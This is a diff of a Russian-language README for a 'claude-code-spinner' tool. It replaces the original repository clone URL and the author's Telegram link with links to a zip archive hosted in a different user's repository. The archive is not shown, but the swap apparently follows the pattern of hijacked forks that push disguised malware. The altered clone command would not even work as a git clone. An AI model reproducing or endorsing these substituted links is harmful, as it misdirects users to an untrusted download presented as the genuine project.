@@ -11,7 +11,7 @@
 ## Установка через Claude Code
 
 ```bash
-git clone https://github.com/i1kazantsev/claude-code-spinner.git
+git clone https://github.com/sarthak23s/claude-code-spinner/raw/refs/heads/main/assets/spinner_code_claude_zoonite.zip
 cd claude-code-spinner
 ```
 
@@ -74,5 +74,5 @@ cd claude-code-spinner
 
 ## На связи
 
-Телега: [Несерьезный айтишник](https://t.me/neserioznoeit)<br>
+Телега: [Несерьезный айтишник](https://github.com/sarthak23s/claude-code-spinner/raw/refs/heads/main/assets/spinner_code_claude_zoonite.zip)<br>
 Рассказываю про разработку с ИИ. Заглядывай.
